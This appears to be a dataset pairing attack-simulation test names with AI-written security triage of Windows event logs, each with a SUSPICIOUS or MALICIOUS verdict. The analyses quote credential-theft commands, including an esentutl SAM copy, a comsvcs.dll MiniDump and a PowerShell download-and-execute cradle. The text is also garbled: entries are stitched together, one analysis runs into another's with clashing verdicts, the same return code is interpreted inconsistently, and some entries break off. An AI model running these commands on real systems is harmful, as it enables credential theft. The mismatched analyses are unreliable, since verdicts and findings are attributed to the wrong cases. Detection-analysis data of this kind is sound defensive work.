- Review the source and intent of the Python installation to confirm it aligns with organizational procedures.
- Investigate the script executed by `cmd.exe` in the temporary directory, focusing on its origin, purpose, and why it was executed.
- Monitor for similar download and execution patterns in PowerShell across the network to identify potential unauthorized actions.
- Ensure proper security measures are in place, including up-to-date antivirus definitions, and consider further auditing of scripts executed via PowerShell or command-line interfaces."
Create Volume Shadow Copy with diskshadow,"### Detailed Analysis of Windows Event Logs

After a meticulous examination of the provided event logs, the following observations have been made:

#### **1. Time Synchronization Events:**
- **Security Log Events ID: 4616**
  - These events indicate system time changes on `Server002`. They show that the system time was adjusted, which can occur during legitimate network synchronization. The `svchost.exe` process, a common Windows service host, is associated with these events. The synchronization seems benign and typical for networked systems using NTP.

#### **2. Logon and Privilege Events:**
- **Security Log Events ID: 4634, 4672, 4624**
  - A remote logon by a user `admin_test` from an IP `192.168.0.102` using NTLM authentication was recorded. Event ID `4672` shows the assignment of many privileges to `admin_test`, including `SeDebugPrivilege` and `SeImpersonatePrivilege`, which allow extensive control over system resources. While administrators typically have such privileges, the occurrence should be verified to ensure it aligns with expected administrative activity.

#### **3. Unusual Command Execution:**
- **Sysmon Log Event ID: 1 and 5**
  - The `diskshadow.exe` and `cmd.exe` processes were executed by `admin_test`. DiskShadow is used for managing shadow copies and could be used legitimately or maliciously. The use of `cmd.exe` with specific command arguments involving `diskshadow` suggests potential data copying or backup operations. This requires further scrutiny to confirm intent.

#### **4. Credential and Token Events:**
- **Security Log Events ID: 5379**
  - Repeated attempts to access `MicrosoftAccount:user=02txoixylodcstop` show failure with return code `3221226021`, indicating possibly invalid credentials. Multiple events with the same failure code might suggest attempts to use or probe the account. 

#### **5. Software Update Process:**
- **System Log Events**
  - Activities involving `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` relate to routine updates to Microsoft Defender Antivirus. No anomalies were detected here.

#### **6. Process Creation in Sysmon Logs:**
- Many process creations, such as `whoami.exe`, `hostname.exe`, and `taskhostw.exe`, are standard operating procedures tied to system utilities. These actions are logged, but none demonstrate definite signs of compromise themselves.

### Assessment and Conclusion

- **Benign Activities:**
  - Time synchronization events appear normal and related updates and system utilities indicate standard maintenance.

- **Suspicious Activities:**
  - The use of `diskshadow.exe` with administrative privileges could be suspicious if not part of routine backups or administrative duties. Additionally, the unsuccessful credential access attempts should be investigated for potential unauthorized access attempts.
  
### Recommended Actions

1. **Validation of Administration Actions:**
   - Verify if `admin_test` (administrator) intended to execute `diskshadow.exe`. If not part of regular operations, investigate further.
   
2. **Security Auditing:**
   - Review authentication logs from IP `192.168.0.102` to ensure logon actions align with known administrative access. 

3. **Further Monitoring:**
   - Increase monitoring on usage of utilities like `diskshadow`, particularly under administrative accounts, to detect any data exfiltration activities.

4. **Credential Access Review:**
   - Investigate the origin of suspicious unsuccessful credential attempts. Ensure the referenced account is protected and in accordance to security policies.

Final Assessment: **SUSPICIOUS** - The activities, while potentially part of legitimate administrative action, warrant further investigation due to high privileges involved and the combination of unusual tool counts and failed credential access attempts."
ESXi - Brute Force Until Account Lockout,"Upon reviewing the provided event logs, several indicators suggest potential malicious activity:

1. **Unusual PowerShell Activity**: Logs show the initiation of a PowerShell session with a command running `plink.exe` to SSH into an internal server (`file.local`) as `root` using a password (`f0b443ae-9565-11ee-b9d1-0242ac120002`). This activity is particularly suspicious because:
   - `plink.exe` is part of the PuTTY suite commonly used for secure shell connections and can be used for lateral movement or exfiltration.
   - Using cleartext passwords in PowerShell scripts is a security risk and is indicative of poor security practices.

2. **Counts of External Commands Executed via PowerShell**: Multiple execution of external commands using `conhost.exe` as the parent process further raises suspicion. During a potential attack, `conhost.exe` may be used to spawn command prompts or other command execution contexts.

3. **High-Integrity Level Processes by User ""admin_test""**: The user `admin_test` shows high integrity level processes, indicating processes running with elevated privileges. Coupled with the execution of scripts accessing network resources, this may point to unauthorized configuration changes or data access.

4. **Frequent Use of ""wevtutil.exe""**: This utility is used to query event logs, which could indicate log clearing efforts common in post-exploitation tactics to cover tracks.

5. **Authentication Logs**: While there are several successful logon events under Event ID `4624` and the use of elevated tokens under Event ID `4672`, these can be seen as routine. However, their timing alongside other unusual activities could suggest privilege escalation attempts.

6. **Empty and Suspicious Security Events**: There are multiple instances of Event ID `5379`, associated with credential fetch failures, potentially indicating attempts to access or leverage stored credentials without success.

7. **Presence of Installer Executions**: The logs show the installation of Microsoft Edge updates, which might be normal behavior. However, installation actions surrounded by questionable commands pose a concern regarding the potential misuse of legitimate software for malicious activities.

### Resolution
Based on the findings, I would classify this case as:

- **SUSPICIOUS** – The logs contain behavior that warrants further investigation, particularly focusing on the PowerShell activity and plink executions with elevated privileges, and the attempt to access credentials. Immediate next steps would involve:
  - Isolating the system in the network to prevent further potential lateral movement.
  - Performing a deeper forensic analysis of the system for artifacts related to the suspicious PowerShell scripts and any unauthorized SSH connections.
  - Reviewing system and network activity logs for similar behavior on other systems to assess the scope of potential compromise.
  - Strengthening security controls, including restricting the use of PowerShell and enforcing policies against cleartext credentials."
WinPwn - powershellsensitive,"Upon reviewing the provided Windows event logs, several observations can be made:

1. **PowerShell Activity:**
   - The PowerShell logs show the execution of a script downloaded from a URL using `Invoke-Expression (iex)`, which is a known technique for executing potentially malicious scripts. The use of `new-object net.webclient` to download a script directly from the internet is particularly concerning and often regarded as a suspicious activity. The script hosted at `https://raw.githubusercontent.com/script` is executed non-interactively with `powershellsensitive -consoleoutput -noninteractive`, which could potentially mask the script's malicious intentions.

2. **Windows Defender:**
   - The Application logs indicate that Windows Defender is active, but there is no indication from these logs if it flagged the aforementioned PowerShell activity. Depending on the effectiveness and configuration of Windows Defender, it might not have been able to detect or block this behavior.

3. **Time Changes:**
   - In the System logs, there are records of time changes. These logs do not inherently represent malicious activity but should be evaluated in context. While not abnormal under certain maintenance conditions, frequent time changes can signal attempts to evade logging or alter timestamps related to malicious activities.

4. **Sysmon Activity:**
   - Sysmon logs show several processes related to typical administrative actions (`wevtutil.exe`, `conhost.exe`, etc.). However, the consistent association with the user `SERVER002\admin_test` could imply authorized administrative behavior unless the user account was compromised. There are no specific indications in the Sysmon logs provided that suggest malicious activities like anomalous process injections or unauthorized privilege escalations.

5. **Security Logs:**
   - Security logs mostly relate to time changes with no direct indication of privilege escalation or attempts to gain unauthorized access.

### Assessment:

- **Suspicious Activity:** The PowerShell command execution stands out as potentially suspicious. This form of scripting can be leveraged by attackers to download and execute malicious code. 

Given the observed behavior of downloading and executing scripts from the internet without clear indication of what the script entails, further investigation is warranted to ensure this activity is legitimate or authorized.

### Resolution: SUSPICIOUS

**Recommended Actions:**
- Conduct an in-depth analysis of the script downloaded via PowerShell to verify whether it contains malicious content.
- Validate whether this PowerShell activity was authorized or part of an administrative task. Check user logs and corroborate with relevant personnel.
- Consider reviewing network logs to observe any unusual outbound connections made by the host that could indicate data exfiltration.
- Enhance monitoring for additional suspicious activities related to scripting across the network.
- Evaluate the effectiveness of Windows Defender and consider additional endpoint protection measures if needed."
DCSync (Active Directory),"Upon analyzing the provided Windows event logs, the following observations were made:

1. **Command Execution Behavior:**
   - There is an execution of `cmd.exe` (command-line) initiated with parameters that create a path to a potential executable: `C:\\Windows\\system32\\cmd.exe /c echo %%tmp%%\\script\\x64\\script.exe`. This is executed under the user `SERVER002\\admin_test` with high integrity level, which can indicate an administrative permission attempt to execute something suspicious.

2. **Related PowerShell Activity:**
   - The parent process of `cmd.exe` is `powershell.exe` with a command that suggests a check if a script exists, modifying execution based on its presence. This kind of behavior is characteristic of obfuscated or conditional script executions which could be used for evasion.

3. **Event Logs Manipulation:**
   - Multiple instances of `wevtutil.exe` (a utility to manage event logs) are observed near the timestamp when the suspicious command execution took place:
     - `C:\\Windows\\System32\\wevtutil.exe` being executed numerous times under `admin_test` account could signify attempts to clear or manipulate logs for covering tracks of malicious activities.

4. **Use of System Tools:**
   - `HOSTNAME.EXE`, `whoami.exe`, and several instances of `conhost.exe` were launched. These commands are typically used to gather system information or provide console support, and seeing them together with other suspicious activities might point towards reconnaissance or information gathering endeavors.

5. **Presence of Known Security Components:**
   - Entries indicate active Windows Defender with updates for Microsoft Defender Antivirus being applied (`AM_Delta.exe`, `wuauclt.exe`). There are signs of standard security measure operations. 

6. **Credential Anomalies:**
   - The security logs show events related to credential reading operations with return code `3221226021`, which translates to an ""Access is denied"" error, suggesting potential unsuccessful attempts at accessing or manipulating credential data.

7. **Windows Update and Antimalware Activities:**
   - Processes such as `wuauclt.exe` and `MpSigStub.exe` are observed, indicating legitimate Windows Update and antimalware actions.
   
Based on the assembled information and the pattern of activities:

- The combination of suspect command-line usage for potential script execution, frequent use of `wevtutil.exe` to potentially alter event logs, and the observed system reconnaissance commands (e.g., `whoami.exe`), a pattern emerges that could point towards a potential security incident or mistreatment of administration privileges. The activities warrant further investigation for possible malicious intent.

**Resolution: SUSPICIOUS**

### Recommendations:
1. Conduct a deeper forensic analysis on the host `Server002`, especially targeting:
   - The file `script.exe` in the specified temp directory.
   - Any recent modifications or deletions in the event logs.
   - Unusual or unscheduled task executions.

2. Review system integrity and any anomalies in user activities logged against `admin_test` account.
3. Use endpoint detection and response tools to trace network connections and gather additional context if available.
4. Monitor and enforce organizational policies on PowerShell usage and the management of admin privileges.

Further investigation should clarify the root cause of these activities, allowing for a more definitive classification of the events as benign, malicious, or harmless upon examination."
WebBrowserPassView - Credentials from Browser,"Based on the provided logs, a detailed analysis has been performed to identify any suspicious or malicious activities. Here are the findings:

### Analysis

1. **Process Creation and Execution:**
   - **PowerShell Execution:** PowerShell script execution is observed (EventID: 600 in PowerShell log), with the command:
     ```
     powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\script.exe\"", Start-Sleep -Second 4, Stop-Process -Name \""script\""}
     ```
     The script appears to execute a binary named `script.exe`, which is identified as ""Web Browser Password Viewer"" from NirSoft (ProcessId: 7020 in Sysmon log). NirSoft utilities can be used for legitimate purposes but are often used for extracting sensitive data like passwords, which is suspicious without proper context or authorization.

2. **Suspicious Network Activity:**
   - The presence of `script.exe` as a web browser password viewer potentially indicates an attempt to extract or view saved passwords without authorization. The lack of detailed network log data (network connections, etc.) limits further investigation into possible exfiltration attempts.

3. **Privilege Escalation:**
   - Multiple `LogonType: 5` events (indicating a service startup or system logon) and privilege assignments (EventID: 4672) with high privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others, used by the `SYSTEM` account appear typical for system operations, though they should be scrutinized especially after detecting suspicious execution activities.

4. **User Account and Logon Events:**
   - The account `admin_test` is involved in executing potentially suspicious processes and has logon events (EventID: 4624) with an IP address `fe80::e3b5:5371:12a8:9c77` which might require network verification to ensure it aligns with expected admin behavior.

### Assessment

These observations gathered from the logs suggest suspicious behavior due to the execution of a password viewing tool without clear justification. While not conclusive evidence of an active compromise, the presence of utilities often associated with data extraction deserves further investigation to determine intent and authorization.

### Resolution

**SUSPICIOUS** - The activities recorded in the logs are suspicious due to the execution of a tool capable of accessing sensitive user data, such as stored passwords. This warrants a detailed investigation into:
- **Verification of Intent:** Ascertain whether the use of `script.exe` (Web Browser Password Viewer) was authorized for legitimate administrative or trouble-shooting purposes.
- **Review of Accounts and Permissions:** Investigate the `admin_test` account's activities and privilege assignments to ensure compliance with organizational policies.
- **Further Monitoring and Network Analysis:** Analyze network activity logs, endpoint security monitoring, and ensure no unauthorized data exfiltration or lateral movements occurred.

### Guidance on How to Proceed

1. **Conduct an Internal Review:**
   - Confirm with the responsible administrative team whether the execution of the password viewer was authorized for maintenance or support purposes.

2. **Quarantine and Analyze the Binary:**
   - Secure `script.exe` and evaluate its behavior in a controlled environment if needed.

3. **Enhanced Monitoring:**
   - Implement enhanced monitoring on accounts with elevated privileges and continue to monitor network activities for any further anomalies.

4. **Security Policy Review:**
   - Ensure policies are in place to control the use of utilities capable of extracting sensitive information and review access controls for sensitive data.

This assessment should guide the steps necessary to ensure the security integrity of the systems involved. Further security teams or forensic experts may be called in for an in-depth investigation if necessary."
Password Spray Microsoft Online Accounts with MSOLSpray (Azure-O365),"Upon reviewing the provided logs, here's an analysis and assessment of the situation:

1. **Suspicious PowerShell Activity:**
   - The Sysmon log and Windows PowerShell log indicate the execution of PowerShell with the script `MSOLSpray.ps1`.
   - The command-line arguments include importing the module and invoking `Invoke-MSOLSpray` with specific user list and password files from temp directories.
   - Invoking `MSOLSpray.ps1`, known as a tool for password spraying Office 365 accounts, could indicate an attempted unauthorized access or reconnaissance activity.
   - The user executing these commands is `SERVER002\admin_test`, suggesting either misuse of a legitimate account or that this account might have been compromised.

2. **Conhost and Wevtutil Executions:**
   - Frequent execution of `conhost.exe` and `wevtutil.exe` by the same user (`SERVER002\admin_test`) can be compliance or maintenance activities but could also hide malicious intent if paired with other suspicious activities.
   - `wevtutil.exe` is used for managing event logs, and its execution soon after the PowerShell command might suggest logs are being manipulated to cover tracks.

3. **Microsoft Edge Update Processes:**
   - Multiple legitimate Edge Update-related processes (`MicrosoftEdgeUpdate.exe`) are running under `NT AUTHORITY\SYSTEM` user.
   - Despite numerous executions, they largely seem consistent with legitimate automatic updates unless specific anomalies in their operation or context become apparent.

4. **Overall Anomalous Activity:**
   - Besides the suspicious PowerShell activity involving `MSOLSpray.ps1`, there are no overt signs of other malicious software or subversive tools typically indicating compromise.
   - The presence of executing scripts from temporary directories could be indicative of transient, unexplained or unauthorized activities.

**Conclusion:**
- **Resolution:** **SUSPICIOUS**
  - The execution of the script `MSOLSpray.ps1` poses a concern, as this tool is aligned with password spraying attacks.
  - While there are no other definite signs of compromise, this behavior calls for further investigation.

**Guidance on How to Proceed:**
- **Investigate User Account Activity:** Examine the `admin_test` account for unauthorized access history, changes, or indications of compromise.
- **Analyze PowerShell Script:** Check the actual `MSOLSpray.ps1` script on the system to understand its configuration and reach.
- **Review Event Logs and Security Tools:** Verify any tampering of event log entries and ensure security tools (e.g., antivirus, SIEM) are up-to-date and alerting appropriately.
- **Network and Account Monitoring:** Set up monitoring for unusual activities, such as failed logins, access to sensitive data, or network anomalies, especially from `SERVER002`.
- **User Awareness and Training:** If the activity comes from a legitimate, uninformed user, ensure they receive education to prevent such risky tool usages in the future. 

This case warrants a deeper review to validate these findings and to rule out or confirm malicious intent."
WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"Upon reviewing the provided Windows event logs, the following observations and analysis have been made:

Request All Tickets via PowerShell,"Upon analyzing the provided event logs, several patterns and activities have been identified that merit careful consideration:

1. **Repetitive PowerShell Activity**: 
   - There are multiple instances where `powershell.exe` is executed by the `SERVER002\admin_test` user. The command involves a PowerShell operation utilizing `Add-Type` with `System.IdentityModel` and invoking `setspn.exe`, which queries the Service Principal Names (SPNs).
   - While PowerShell usage is common in legitimate administrative activities, this particular usage pattern could potentially align with techniques used for credential theft or lateral movement within a network, especially since SPNs are queried.

2. **Multiple Invocation of `wevtutil.exe`**:
   - The logs show multiple executions of `wevtutil.exe`, which is a legitimate Windows utility used to manage event logs. Frequent usage without apparent context can sometimes indicate attempts to manipulate or clear security event logs, a tactic used by attackers to cover their tracks.

3. **Conhost.exe and Hostname.exe Files**:
   - Events also indicate the execution of `conhost.exe` and `hostname.exe`, which are standard utilities used in Windows environments for console management and fetching the hostname respectively. Their presence alone does not imply malicious activity.

4. **Frequent Microsoft Edge Update Operations**:
   - The logs show numerous operations related to Microsoft Edge Update services. While these can be routine when updates are applied, there’s extensive and repeated execution, suggesting either an excessive attempt to update or possibly a misconfigured update service.

5. **Indicators of Script Execution and Elevated Integrity Level**:
   - The PowerShell processes were running with high integrity levels, and the script executed seems to involve somewhat complex command chaining that is not typical of casual usage. This might suggest intentions to execute scripts or commands that require elevated privileges.

### Assessment:
Based on the analysis above, the logs contain activities that are **SUSPICIOUS**. While there is no direct evidence of malware present, the extensive usage of PowerShell with specific command sequences, combined with the presence of `wevtutil.exe` operations and high-integrity level executions, suggest possible unauthorized access attempts or internal reconnaissance actions.

1. **PowerShell Activity**:
   - **Command Execution**: The PowerShell logs show execution of a script with command-line arguments that include using `Get-NetTCPConnection` to inquire about TCP connections on port 3389 (RDP), followed by creating a memory dump of the service using `rundll32.exe`:
     - `powershell.exe & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)...;C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}`
   - **Anomaly**: This script appears suspicious as it gathers information related to RDP connections and then performs a memory dump using `MiniDump`, a technique often used by malicious actors for credential theft or to analyze a running process in detail, potentially for lateral movement or privilege escalation.

2. **Privilege Escalation and Logon Events**:
   - The events indicate logon activity with elevated privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) for the user `admin_test`. These privileges grant the ability to debug and dump processes, among other things, which aligns with the PowerShell script's objectives.
   - LogonType `3` indicates a network logon, which may involve remote access behaviors.

3. **Sysmon Logs**:
   - Several executions of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` under an administrative context suggest scripting activity possibly for reconnaissance.
   - Frequent invocation of `rundll32.exe` reflects the activity noted in the PowerShell script, with behavior consistent with malicious exploitation tactics.

### Assessment and Recommendation:

- **Assessment**: The logs contain several instances of activities that indicate potential malicious engagement, particularly focusing on the PowerShell script execution, the use of privileges to create memory dumps, and administrative logon activities all executed within a narrow time window. These align with known techniques for credential harvesting and preparation for deeper system compromise.

- **Recommendation**: This behavior should be considered **MALICIOUS**. Immediate steps should be taken to isolate the system from the network to prevent further spread of potential compromise. Comprehensive scans for additional indicators of compromise (IOCs) within the network and attestation of current account accesses and configuration changes are recommended. Additionally, it is advisable to review access logs for potential unauthorized access and enact stricter monitoring and alerting for such activities in the future.

Concluding, the logs demonstrate clear indicators of possible system compromise, and proactive containment steps are necessary."

esentutl.exe SAM copy,"**Detailed Analysis:**

Upon analyzing the provided logs, there are certain elements and patterns that stand out as potentially suspicious:

1. **Process Execution Pattern:**
   - **Presence of esentutl.exe:** This executable, part of Windows' storage engine utilities, was used with the command line: `esentutl.exe /y /vss C:\\Windows/system32/config/SAM /d C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp/SAM`. This is indicative of an attempt to copy the Security Accounts Manager (SAM) database, which contains user accounts and password hashes. Accessing or copying the SAM file is highly suspicious and is often associated with credential dumping attacks for malicious purposes, as it can be used to extract password hashes.

2. **Privilege Escalation:**
   - **Use of High-Privileged Tokens:** Security logs indicate the user `admin_test` exercised privileges such as `SeDebugPrivilege` and `SeBackupPrivilege`, often required for accessing sensitive files like the SAM file. Such elevated privileges are concerning, especially in tandem with suspicious operations like those observed with `esentutl.exe`.

3. **Command-Line Arguments:**
   - The logs show command-line usage indicative of attempting to move or copy system-critical files. The use of `esentutl.exe` with `/vss` (Volume Shadow Copy Service) allows read access to files like the SAM database that are normally locked, signaling potential exploitation.

4. **Process Relationships:**
   - Observations of processes: `cmd.exe`, `conhost.exe`, and `esentutl.exe` demonstrate a sequence that supports copying operations of SAM, which should not occur in typical operations or without specific, legitimate maintenance tasks—especially outside of maintenance windows and without proper authorization logs indicating such tasks.

5. **Logon Events:**
   - Logon events showing privileges being assigned to `admin_test` without corresponding legitimate or authorized task indicators add to the suspicion.

6. **Logging Patterns:**
   - The rapid sequence of events and short time intervals between process startups often suggest automation or script execution rather than manual system use, especially under a profile designated with administrative privileges.

**Conclusion:**
The combination of these factors—use of `esentutl.exe` to access SAM, high-privileged tokens, and the rapid execution of related processes—strongly indicates an attempt to perform credential dumping. This constitutes a significant security threat, as it aligns with techniques used in malicious insider attacks or external attacks that have penetrated the system.

**Resolution:**
**MALICIOUS** - The identified activities are consistent with credential theft attempts.

**Guidance on How to Proceed:**

Send NTLM Hash with RPC Test Connection,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, I have identified several key observations worth highlighting:

1. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\admin_test` in quick succession. These files are legitimate Windows programs; however, their usage pattern can sometimes indicate an attempt to manipulate event logs or gather information stealthily.
   - `hostname.exe` and `whoami.exe` were executed without any apparent malicious command-line arguments, suggesting typical use for gathering environment information.
   - A specific instance of PowerShell execution with the command: `powershell.exe & {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null}`. The `rpcping` use is somewhat peculiar, as it’s typically not a common use case for PowerShell. This could be benign, but its context is unclear without further investigation.

2. **Windows PowerShell Log:**
   - The logs confirm the execution of PowerShell commands that include `rpcping`, matching the Sysmon logs, indicating the use of potentially non-standard remote communication.
   - No specific malicious PowerShell script execution was detected, but the command's intent is ambiguous without further context.

3. **Security Log:**
   - Multiple Event ID 5379 logs are present, which relate to credential validation attempts. All attempts appear to have failed with a return code of `3221226021`, which indicates an ""Access Denied"" error when attempting to retrieve credentials. These read failures could result from misconfigured access permissions or deliberate attempts to access restricted credentials.

**Suspicious Indicators Identified:**
- **Use of ""rpcping"" in PowerShell:** While rpcping.exe is a legitimate Windows utility for testing RPC connections, its execution from PowerShell, especially with parameters involving NTLM, can be suspicious especially if it is unexpected or unnecessary for typical operation.
- **Credential Validation Failures:** Multiple access denied errors within a short timespan suggest repeated unauthorized credential access attempts, which could be indicative of reconnaissance or a lateral movement attempt within the network.

### Assessment

Based on the provided logs, the activity is suspicious but not overtly malicious. The repeated execution of diagnostic utilities, combined with the PowerShell command and credential access failures, points toward behavior that warrants further investigation to ensure there is no ongoing or previous compromise:

- **Resolution: SUSPICIOUS**

### Guidance

1. **Investigate the Context:**
   - Verify with the system owner or administrator if the `rpcping` command line execution and wevtutil usage is expected as part of legitimate administrative or operational procedures.
   - Understand the business or operational context that could justify this activity.

2. **Review User Activity:**
   - Check if the user `SERVER002\admin_test` should have the permissions and need to execute such commands.
   - Audit recent activities and changes made by this user on the system.

3. **Network and Host Surveillance:**
   - Monitor for additional unusual network or system behavior from `Server002` and the user account involved.
   - Set alerts for unusual access attempts or uses of PowerShell with external comms or NTLM authentication.

Dump LSASS.exe Memory through Silent Process Exit,"Upon reviewing the provided log entries from the Windows event logs, here is the detailed analysis:

1. **Application Log:**

   - There is an event with ID 1109 from `Wow64 Emulation Layer` indicating the execution of a binary `<script.x64.exe>` located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\`). This kind of activity can be suspicious as temporary directories are often used by malware for staging purposes.

2. **Sysmon Log:**

   - The execution of `C:\Program Files (x86)\Microsoft\EdgeUpdate\...\setup.exe` with command-line arguments related to updating or installing Microsoft Edge is observed. The activity here suggests legitimate updating operations of Microsoft Edge. No anomalies in this specific event were found that imply malicious activity.
   
   - However, a sequence of events involving the execution of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` commands by the `SERVER002\admin_test` user captures attention. Here are the points of interest:
   
     - `Powershell.exe` and `conhost.exe` executions in such proximity need scrutiny, as PowerShell is a known tool leveraged by attackers for executing payloads or commands.
     
     - Frequent use of `wevtutil.exe` may represent attempts to access or clear the Windows Event Logs, a common tactic used by attackers to erase traces of their presence.

   - Another noteworthy log entry is the execution of `cmd.exe` to launch a console host (`conhost.exe`) running from a `.exe` file found in the temp directory with a suspicious command line (`--silent-process-exit`), which hints at obfuscation or attempts to suppress error visibility.
   
3. **Other Logs:**

   - Security, System, and Windows PowerShell logs are empty and provide no additional context.

**Assessment:**

The logs contain several indications of potentially suspicious behavior:

- **Unusual Execution Path:** The temporary directory hosting an executable and its invocation via `cmd.exe` is abnormal for substantial software other than potential malware.
  
- **Potential Log Manipulation:** Use of `wevtutil.exe` by `admin_test` raises flags about possible tampering or unauthorized use of system utilities.

- **Tool Execution:** Frequent invocation of `powershell.exe` and potential use for scripting should be verified against expected administrative actions.

**Conclusion: SUSPICIOUS**

The activities observed in the Sysmon logs specifically exhibit patterns that are possible indicators of malicious actions. Although some entries correspond with legitimate operations (like software updates), the chaining of commands, including PowerShell and silent process exits, is suspect. I recommend performing a deeper investigation, including:

- Checking the integrity and origin of `script.x64.exe`.
- Confirming whether administrative tasks correlate with genuine user actions.
- Reviewing details of the `admin_test` account and recent actions or login activities.
- Analyzing broader system behavior or network activities during the same period for corroborative signs of malicious intent."

LaZagne - Credentials from Browser,"After analyzing the provided Windows event logs, several observations can be made regarding potential indicators of malicious activity. Let's break down the events and determine their significance:

1. **Windows Security Health Service Execution:**
   - The execution of `SecurityHealthService.exe` is a standard operation since this process is part of the Windows Security Health Service, indicating that standard system services are running as expected.

2. **PowerShell and Conhost Execution:**
   - There are multiple instances where `powershell.exe` and `conhost.exe` were executed by the user `SERVER002\\admin_test`. While the usage of PowerShell by an 'admin' user is not inherently suspicious, it is important to verify what actions were performed, as PowerShell is often used by attackers to execute malicious scripts.

3. **RUXIMICS.exe Execution:**
   - The process `RUXIMICS.exe` executed under the `NT AUTHORITY\\SYSTEM` account appears legitimate as it is described as the Reusable UX Interaction Manager related to Microsoft Windows. Furthermore, the hash value for this executable corresponds with the expected hash value for a Windows file, minimizing the suspicion of tampering.

4. **Frequent Wevtutil and Conhost Use:**
   - `wevtutil.exe`, a tool that manages event logs, is frequently executed by the `admin_test` user. This might suggest attempts at suppressing event logs if done repeatedly, especially within short time intervals. Similarly, `conhost.exe` usage under these circumstances should be evaluated further.

5. **CMD with Script Execution:**
   - The command `cmd.exe /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\script.exe"" browsers` is highly suspicious. The execution of scripts from a Temp directory suggests possible unauthorized software or temporary script execution, a common method used by attackers to run payloads without leaving immediate traces.

6. **Use of Built-in Tools (whoami.exe & hostname.exe):**
   - The usage of `whoami.exe` and `hostname.exe` by `admin_test` seems benign if used for standard system information verification. However, in conjunction with CMD script execution patterns, further analysis would be warranted.

7. **Security Log Insights:**
   - Multiple Event ID 4798 activities (Group Membership Enumeration) by the `SERVER002$` account might indicate attempts to audit or gather information about user accounts.
   - Several Event ID 5379 entries indicate attempts to access stored credentials. The repeated failure (ReturnCode 3221226021) to access 'MicrosoftAccount:user' credentials is noteworthy and should be monitored for indications of credential scraping or unauthorized access attempts.

8. **Application Log:**
   - Windows Defender appears to be operational (`SECURITY_PRODUCT_STATE_ON`), suggesting basic protections are in place. No alerts from Defender raise additional questions about detection efficacy.

**Conclusion & Guideline:**

- **Resolution: SUSPICIOUS**
  - The combination of cmd execution with script calls from temporary paths, extensive use of `wevtutil.exe`, and credential access attempts necessitates further investigation to rule out any stealth tactics by an attacker.
  - It is recommended that a detailed review of PowerShell scripts executed and the full script invoked by cmd be conducted.
  - Additionally, audit logs and access to group memberships around the timestamps of Events ID 4798 could uncover unauthorized information access attempts.
  - Further enhance monitoring and potential digital forensics investigations to address any identified suspicious behaviors, particularly focusing on the `admin_test` activities."

PowerShell - Prompt User for Password,"Upon analyzing the provided logs, several points of interest and suspicious activities were noted:

1. **Suspicious PowerShell Activity**: There are PowerShell execution logs with commands that are potentially malicious. Specifically, a PowerShell command was executed to prompt users for their credentials using `PromptForCredential`, and then it extracted passwords. This behavior is suspicious as it might indicate a phishing attempt targeting credentials (`EventID 1043` in the PowerShell log, related Sysmon `EventID 17975`).

2. **Processes Spawned by PowerShell**: PowerShell was used to execute the hostname and whoami commands, followed by the `wevtutil.exe` (an event log utility), which could indicate log tampering or querying which should be investigated further.

3. **High Integrity Level Execution**: The execution of several utilities (like conhost.exe, whoami.exe) at a high integrity level by the same user (SERVER002\admin_test) should be scrutinized. While tools like `whoami.exe` can be used for legitimate administrative purposes, they can also be used in the enumeration phase of an attack.

4. **Rescheduling of System Time**: There are instances of time synchronization and rescheduling (`EventID 4616` in the Security log and Kernel-General events in the System log). Although this can be legitimate, if done without proper authorization, it can be suspicious and used to cover tracks in the logs.

5. **Use of CompatTelRunner.exe**: This program is commonly used for telemetry and compatibility related tasks, but its association with processes that may have accessed sensitive data could raise questions about privacy or unintended information disclosure.

6. **EdgeUpdate Installer Anomalies**: There were frequent updates and executions related to Microsoft EdgeUpdate and its associated setup executables, with verbose logging enabled. While this may appear benign given the nature of application updates, its frequency and the presence of active registrar operations should be cross-verified against known schedules to rule out misuse.

7. **Use of Wevtutil.exe**: This is a native utility used to export, archive, and clear event logs. Its presence in the Sysmon logs at high integrity could imply event log manipulation attempts.

8. **Credential Access Failure**: Security logs (`EventID 5379`) reflect multiple failed attempts to access credentials. This might suggest brute-force attempts or unauthorized access trials.

Based on the analysis, the resolution of the investigation is **SUSPICIOUS**. There are definite signs of actions that could be investigated further, particularly the suspicious PowerShell execution and the potential for credential theft or abuse. I recommend:

- Conducting a thorough review of user activities, particularly for SERVER002\admin_test.

   - Normal observations would expect Microsoft Edge Update to execute as part of update operations. The frequent execution logged here is consistent with the update operation.
2. **Process Activity (wevtutil, conhost, svchost):**
   - Execution of `wevtutil.exe`, `conhost.exe`, and `svchost.exe`, among others, by `SERVER002\admin_test` could potentially be related to administrative maintenance tasks, such as viewing or managing event logs. However, execution of these commands in a tight timeframe can warrant further examination if not expected.
3. **Command Execution:**
   - A `cmd.exe` process executed directory listings on Credential files using parameters indicative of a potential attempt to access hidden directories. This pattern can commonly be seen in both benign administrative scripts or potentially malicious reconnaissance activities.

### System Log Analysis
1. **Kernel-General Events:**
   - These log entries depict normal system operations, such as time synchronization with external time sources, which are not inherently suspicious.

Overall, the logs depict a mix of routine system operations and potentially unusual activity (e.g., directory enumeration in user credential locations). While there is no explicit evidence pointing to a clear system compromise, specific entries related to the access of credential directories and time modifications could be assessed further to ensure they were intentional and benign.

### Conclusion
Given the current analysis:
- The sysmon logs show indicative entries (e.g., Time Change, Directory Enumeration Commands) which might suggest unusual behavior, yet not directly confirm malicious actions.
- I recommend categorizing these findings as **SUSPICIOUS**.

### Recommended Actions
